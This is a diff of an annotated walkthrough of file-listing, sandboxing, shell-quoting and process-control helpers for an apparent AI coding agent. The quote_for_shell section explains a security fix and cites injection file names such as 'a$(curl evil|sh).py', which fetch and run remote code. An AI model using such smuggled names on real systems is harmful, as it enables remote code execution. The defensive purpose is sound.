@@ -86,42 +86,45 @@ goes through `walk_files` (never entering folders such as `node_modules` or `.ve
 ```python
  46 | def _in_git_repo(root: Path) -> bool:
  47 |     """True when ``root`` or a folder above it holds a ``.git`` entry (folder or file)."""
- 48 |     return any((folder / ".git").exists() for folder in (root, *root.parents))
- 49 | 
+ 48 |     real = root.resolve()
+ 49 |     return any((folder / ".git").exists() for folder in (real, *real.parents))
  50 | 
+ 51 | 
 ```
 - True when the folder, or any folder above it, contains `.git` (a folder normally; a *file* in git worktrees and
-  submodules). Checking first avoids starting `git` for folders that are not repositories.
+  submodules). Checking first avoids starting `git` for folders that are not repositories. The folder is resolved
+  (made absolute) for this check only.
 
 ```python
- 51 | def project_files(root: Path) -> Iterator[Path]:
- 52 |     """Like ``walk_files``, but in a git repository the files .gitignore excludes are left out.
- 53 | 
- 54 |     ``git ls-files`` knows the ignore rules exactly (nested .gitignore files, global
- 55 |     excludes), so build output and downloads the project ignores never reach the model.
- 56 |     Without git, or outside a repository, every file is walked as usual.
- 57 |     """
- 58 |     root = root.resolve()
- 59 |     listed = None
- 60 |     if _in_git_repo(root):
- 61 |         try:
- 62 |             done = subprocess.run(["git", "-C", str(root), "ls-files", "--cached", "--others",
- 63 |                                    "--exclude-standard", "-z"], capture_output=True, timeout=30)
- 64 |             listed = done.stdout if done.returncode == 0 else None
- 65 |         except (OSError, subprocess.TimeoutExpired):
- 66 |             listed = None
- 67 |     names = sorted({name for name in (listed or b"").decode("utf-8", "replace").split("\0") if name})
- 68 |     if not names:                            # no git, or the whole folder is ignored (e.g. the
- 69 |         yield from walk_files(root)          # server's session folders): walk it as usual
- 70 |         return
- 71 |     for name in names:
- 72 |         if any(skip_dir(part) for part in name.split("/")[:-1]):
- 73 |             continue
- 74 |         path = root / name
- 75 |         if path.is_file():                   # --cached also lists files deleted since the commit
- 76 |             yield path
- 77 | 
- 78 | 
+ 52 | def project_files(root: Path) -> Iterator[Path]:
+ 53 |     """Like ``walk_files``, but in a git repository the files .gitignore excludes are left out.
+ 54 | 
+ 55 |     ``git ls-files`` knows the ignore rules exactly (nested .gitignore files, global
+ 56 |     excludes), so build output and downloads the project ignores never reach the model.
+ 57 |     Without git, or outside a repository, every file is walked as usual. Paths come back in the
+ 58 |     form ``root`` was given (like ``walk_files``), so ``relative_to(root)`` always works - on
+ 59 |     Windows a folder may be named in two ways (``RUNNER~1`` and ``runneradmin``).
+ 60 |     """
+ 61 |     listed = None
+ 62 |     if _in_git_repo(root):
+ 63 |         try:
+ 64 |             done = subprocess.run(["git", "-C", str(root), "ls-files", "--cached", "--others",
+ 65 |                                    "--exclude-standard", "-z"], capture_output=True, timeout=30)
+ 66 |             listed = done.stdout if done.returncode == 0 else None
+ 67 |         except (OSError, subprocess.TimeoutExpired):
+ 68 |             listed = None
+ 69 |     names = sorted({name for name in (listed or b"").decode("utf-8", "replace").split("\0") if name})
+ 70 |     if not names:                            # no git, or the whole folder is ignored (e.g. the
+ 71 |         yield from walk_files(root)          # server's session folders): walk it as usual
+ 72 |         return
+ 73 |     for name in names:
+ 74 |         if any(skip_dir(part) for part in name.split("/")[:-1]):
+ 75 |             continue
+ 76 |         path = root / name
+ 77 |         if path.is_file():                   # --cached also lists files deleted since the commit
+ 78 |             yield path
+ 79 | 
+ 80 | 
 ```
 - In a git repository, asks git for the project's files: `ls-files --cached` (tracked) `--others` (new, not yet added)
   `--exclude-standard` (but not what `.gitignore` excludes), `-z` (names separated by a zero byte, so any file name is
@@ -130,6 +133,9 @@ goes through `walk_files` (never entering folders such as `node_modules` or `.ve
   5 GB model from the file overview.
 - Paths inside a skipped folder are still dropped, and so are files `--cached` lists although they were deleted since
   the last commit.
+- The paths are built from `root` **exactly as it was given**, like `walk_files` does. The first version resolved it
+  first, and the first CI run on Windows showed why that is wrong: Windows can name one folder in two ways (the short
+  `RUNNER~1` and the long `runneradmin`), so a caller's `path.relative_to(root)` failed.
 - Falls back to `walk_files` when git is missing, the folder is not a repository, git fails — or git lists nothing at
   all, which happens when the whole folder is ignored (the HTTP server keeps its session workspaces in an ignored
   `sessions/` folder; without the fallback the model would see an empty project).
@@ -138,15 +144,15 @@ goes through `walk_files` (never entering folders such as `node_modules` or `.ve
 
 ## `looks_binary`
 ```python
- 79 | def looks_binary(path: Path) -> bool:
- 80 |     """True for a file that is not text (a NUL byte early on): images, models, programs."""
- 81 |     try:
- 82 |         with path.open("rb") as handle:
- 83 |             return b"\0" in handle.read(8192)
- 84 |     except OSError:
- 85 |         return False
- 86 | 
- 87 | 
+ 81 | def looks_binary(path: Path) -> bool:
+ 82 |     """True for a file that is not text (a NUL byte early on): images, models, programs."""
+ 83 |     try:
+ 84 |         with path.open("rb") as handle:
+ 85 |             return b"\0" in handle.read(8192)
+ 86 |     except OSError:
+ 87 |         return False
+ 88 | 
+ 89 | 
 ```
 - Reads the first 8 KB: text files never contain a zero byte, while images, programs and model files almost always do.
   `read_file` refuses such files and `search` skips them — before 0.6, reading a binary file returned thousands of
@@ -154,24 +160,24 @@ goes through `walk_files` (never entering folders such as `node_modules` or `.ve
 
 ## `SandboxError`
 ```python
- 88 | class SandboxError(Exception):
- 89 |     """Raised when the model asks for something outside the allowed area."""
- 90 | 
- 91 | 
+ 90 | class SandboxError(Exception):
+ 91 |     """Raised when the model asks for something outside the allowed area."""
+ 92 | 
+ 93 | 
 ```
 - Raised when a path escapes the workspace. Tools turn it into an `ERROR:` string for the model.
 
 ## `resolve_inside`
 ```python
- 92 | def resolve_inside(root: Path, relative: str) -> Path:
- 93 |     """Return the absolute path for ``relative`` or raise if it escapes ``root``."""
- 94 |     root = root.resolve()
- 95 |     candidate = (root / relative).resolve()  # resolves "..", symlinks, absolute inputs
- 96 |     if candidate != root and root not in candidate.parents:
- 97 |         raise SandboxError(f"path '{relative}' is outside the workspace")
- 98 |     return candidate
- 99 | 
-100 | 
+ 94 | def resolve_inside(root: Path, relative: str) -> Path:
+ 95 |     """Return the absolute path for ``relative`` or raise if it escapes ``root``."""
+ 96 |     root = root.resolve()
+ 97 |     candidate = (root / relative).resolve()  # resolves "..", symlinks, absolute inputs
+ 98 |     if candidate != root and root not in candidate.parents:
+ 99 |         raise SandboxError(f"path '{relative}' is outside the workspace")
+100 |     return candidate
+101 | 
+102 | 
 ```
 - Makes the workspace root absolute, joins the requested path to it and calls `resolve()`: this collapses `..`,
   follows symlinks, and — if the request was absolute like `C:\Windows` — discards the root entirely, which is
@@ -180,16 +186,16 @@ goes through `walk_files` (never entering folders such as `node_modules` or `.ve
 
 ## `truncate`
 ```python
-101 | def truncate(text: str, limit: int) -> str:
-102 |     """Shorten long text, keeping the start and the end (errors are usually last)."""
-103 |     if len(text) <= limit:
-104 |         return text
-105 |     head = limit * 2 // 3
-106 |     tail = limit - head
-107 |     omitted = len(text) - limit
-108 |     return f"{text[:head]}\n... [{omitted} characters omitted] ...\n{text[-tail:]}"
-109 | 
-110 | 
+103 | def truncate(text: str, limit: int) -> str:
+104 |     """Shorten long text, keeping the start and the end (errors are usually last)."""
+105 |     if len(text) <= limit:
+106 |         return text
+107 |     head = limit * 2 // 3
+108 |     tail = limit - head
+109 |     omitted = len(text) - limit
+110 |     return f"{text[:head]}\n... [{omitted} characters omitted] ...\n{text[-tail:]}"
+111 | 
+112 | 
 ```
 - Short text is returned unchanged. Otherwise the head gets two thirds of the budget, the tail the rest, with a marker
   saying how many characters were dropped. Errors and summaries usually appear at the end of output, so keeping the
@@ -197,13 +203,13 @@ goes through `walk_files` (never entering folders such as `node_modules` or `.ve
 
 ## `shell_argv`
 ```python
-111 | def shell_argv(command: str) -> list[str]:
-112 |     """How this computer runs one shell command: PowerShell on Windows, ``sh`` elsewhere."""
-113 |     if os.name == "nt":
-114 |         return ["powershell", "-NoProfile", "-NonInteractive", "-Command", command]
-115 |     return ["sh", "-c", command]
-116 | 
-117 | 
+113 | def shell_argv(command: str) -> list[str]:
+114 |     """How this computer runs one shell command: PowerShell on Windows, ``sh`` elsewhere."""
+115 |     if os.name == "nt":
+116 |         return ["powershell", "-NoProfile", "-NonInteractive", "-Command", command]
+117 |     return ["sh", "-c", command]
+118 | 
+119 | 
 ```
 - The one place that decides how a shell command runs on this computer: PowerShell (`-NoProfile` = skip your profile
   script, `-NonInteractive` = never wait for typing, `-Command` = run this text) on Windows, `sh -c` elsewhere. Used by
@@ -211,21 +217,21 @@ goes through `walk_files` (never entering folders such as `node_modules` or `.ve
 
 ## `quote_for_shell`
 ```python
-118 | def quote_for_shell(word: str) -> str:
-119 |     """``word`` (e.g. a file name) written so the shell of ``shell_argv`` takes it literally.
-120 | 
-121 |     A file name chosen by the model must never be able to run a command of its own, such as
-122 |     ``a$(curl evil).py``; a name starting with ``-`` must never be read as an option.
-123 |     """
-124 |     if word.startswith("-"):
-125 |         word = "./" + word
-126 |     if SAFE_WORD.fullmatch(word):
-127 |         return word
-128 |     if os.name == "nt":                                  # PowerShell: '' is a quote inside '...'
-129 |         return "'" + word.replace("'", "''") + "'"
-130 |     return shlex.quote(word)
-131 | 
-132 | 
+120 | def quote_for_shell(word: str) -> str:
+121 |     """``word`` (e.g. a file name) written so the shell of ``shell_argv`` takes it literally.
+122 | 
+123 |     A file name chosen by the model must never be able to run a command of its own, such as
+124 |     ``a$(curl evil).py``; a name starting with ``-`` must never be read as an option.
+125 |     """
+126 |     if word.startswith("-"):
+127 |         word = "./" + word
+128 |     if SAFE_WORD.fullmatch(word):
+129 |         return word
+130 |     if os.name == "nt":                                  # PowerShell: '' is a quote inside '...'
+131 |         return "'" + word.replace("'", "''") + "'"
+132 |     return shlex.quote(word)
+133 | 
+134 | 
 ```
 - **A security fix of version 0.6.** Hooks such as `"after_edit": "ruff check {file}"` paste the changed file's name into
   a shell command, and the model chooses file names. A file named `a$(curl evil|sh).py` (perfectly legal on Windows and
@@ -238,78 +244,78 @@ goes through `walk_files` (never entering folders such as `node_modules` or `.ve
 
 ## Running programs safely
 ```python
-133 | def kill_tree(process: subprocess.Popen) -> None:
-134 |     """Stop a program and every program it started (best effort, never raises)."""
-135 |     if sys.platform == "win32":
-136 |         try:
-137 |             subprocess.run(["taskkill", "/F", "/T", "/PID", str(process.pid)],
-138 |                            capture_output=True, timeout=30)
-139 |         except (OSError, subprocess.TimeoutExpired):
-140 |             pass
-141 |     else:
-142 |         try:
-143 |             os.killpg(process.pid, signal.SIGKILL)      # its own process group (see run_command)
-144 |         except OSError:
-145 |             pass
-146 |     try:
-147 |         process.kill()
-148 |     except OSError:
-149 |         pass
-150 | 
-151 | 
+135 | def kill_tree(process: subprocess.Popen) -> None:
+136 |     """Stop a program and every program it started (best effort, never raises)."""
+137 |     if sys.platform == "win32":
+138 |         try:
+139 |             subprocess.run(["taskkill", "/F", "/T", "/PID", str(process.pid)],
+140 |                            capture_output=True, timeout=30)
+141 |         except (OSError, subprocess.TimeoutExpired):
+142 |             pass
+143 |     else:
+144 |         try:
+145 |             os.killpg(process.pid, signal.SIGKILL)      # its own process group (see run_command)
+146 |         except OSError:
+147 |             pass
+148 |     try:
+149 |         process.kill()
+150 |     except OSError:
+151 |         pass
+152 | 
+153 | 
 ```
 - Stops a program **and every program it started**: on Windows `taskkill /F /T` (force, whole tree), elsewhere a kill
   signal to the program's process group (see `run_command`). Then the program itself, in case. Errors are ignored —
   it may already have ended.
 
 ```python
-152 | def _leftover_output(process: subprocess.Popen) -> tuple[str, str]:
-153 |     """What a killed program printed before it died (empty when its pipes stay blocked)."""
-154 |     try:
-155 |         out, err = process.communicate(timeout=5)
-156 |     except (subprocess.TimeoutExpired, ValueError, OSError):
-157 |         return "", ""
-158 |     return out or "", err or ""
-159 | 
-160 | 
+154 | def _leftover_output(process: subprocess.Popen) -> tuple[str, str]:
+155 |     """What a killed program printed before it died (empty when its pipes stay blocked)."""
+156 |     try:
+157 |         out, err = process.communicate(timeout=5)
+158 |     except (subprocess.TimeoutExpired, ValueError, OSError):
+159 |         return "", ""
+160 |     return out or "", err or ""
+161 | 
+162 | 
 ```
 - After a kill, collects what the program printed before it died (at most 5 more seconds); when even that blocks, it
   gives up with nothing rather than hanging.
 
 ```python
-161 | def run_command(argv: list[str], cwd: Path, timeout: int, limit: int,
-162 |                 input_text: str | None = None) -> tuple[int, str]:
-163 |     """Run a program (never through a shell) and return (exit code, output).
-164 | 
-165 |     The program reads ``input_text`` (or nothing: a program waiting for typing would otherwise
-166 |     take the user's keyboard), and it runs in a process group of its own, so a timeout or
-167 |     Ctrl+C stops everything it started - a server it launched, a test runner's workers -
-168 |     instead of waiting for them forever.
-169 |     """
-170 |     options: dict = {}
-171 |     if sys.platform == "win32":
-172 |         options["creationflags"] = subprocess.CREATE_NEW_PROCESS_GROUP
-173 |     else:
-174 |         options["start_new_session"] = True
-175 |     env = {**os.environ, "PYTHONIOENCODING": "utf-8"}   # Python children can print any character
-176 |     try:
-177 |         process = subprocess.Popen(
-178 |             argv, cwd=cwd, env=env, text=True, encoding="utf-8", errors="replace",
-179 |             stdin=subprocess.DEVNULL if input_text is None else subprocess.PIPE,
-180 |             stdout=subprocess.PIPE, stderr=subprocess.PIPE, **options)
-181 |     except FileNotFoundError as exc:
-182 |         return 127, f"Command not found: {exc}"
-183 |     try:
-184 |         out, err = process.communicate(input_text, timeout=timeout)
-185 |     except subprocess.TimeoutExpired:
-186 |         kill_tree(process)
-187 |         out, err = _leftover_output(process)
-188 |         report = f"Command timed out after {timeout}s and was killed.\n{out}{err}".strip()
-189 |         return 124, truncate(report, limit)
-190 |     except KeyboardInterrupt:
-191 |         kill_tree(process)
-192 |         raise
-193 |     return process.returncode, truncate((out or "") + (err or ""), limit)
+163 | def run_command(argv: list[str], cwd: Path, timeout: int, limit: int,
+164 |                 input_text: str | None = None) -> tuple[int, str]:
+165 |     """Run a program (never through a shell) and return (exit code, output).
+166 | 
+167 |     The program reads ``input_text`` (or nothing: a program waiting for typing would otherwise
+168 |     take the user's keyboard), and it runs in a process group of its own, so a timeout or
+169 |     Ctrl+C stops everything it started - a server it launched, a test runner's workers -
+170 |     instead of waiting for them forever.
+171 |     """
+172 |     options: dict = {}
+173 |     if sys.platform == "win32":
+174 |         options["creationflags"] = subprocess.CREATE_NEW_PROCESS_GROUP
+175 |     else:
+176 |         options["start_new_session"] = True
+177 |     env = {**os.environ, "PYTHONIOENCODING": "utf-8"}   # Python children can print any character
+178 |     try:
+179 |         process = subprocess.Popen(
+180 |             argv, cwd=cwd, env=env, text=True, encoding="utf-8", errors="replace",
+181 |             stdin=subprocess.DEVNULL if input_text is None else subprocess.PIPE,
+182 |             stdout=subprocess.PIPE, stderr=subprocess.PIPE, **options)
+183 |     except FileNotFoundError as exc:
+184 |         return 127, f"Command not found: {exc}"
+185 |     try:
+186 |         out, err = process.communicate(input_text, timeout=timeout)
+187 |     except subprocess.TimeoutExpired:
+188 |         kill_tree(process)
+189 |         out, err = _leftover_output(process)
+190 |         report = f"Command timed out after {timeout}s and was killed.\n{out}{err}".strip()
+191 |         return 124, truncate(report, limit)
+192 |     except KeyboardInterrupt:
+193 |         kill_tree(process)
+194 |         raise
+195 |     return process.returncode, truncate((out or "") + (err or ""), limit)
 ```
 - Takes a list `argv` (program + arguments), the folder to run in, a timeout, an output cap and optional input text.
 - **Never through a shell** (a list, never `shell=True`), so nothing in the arguments is interpreted.
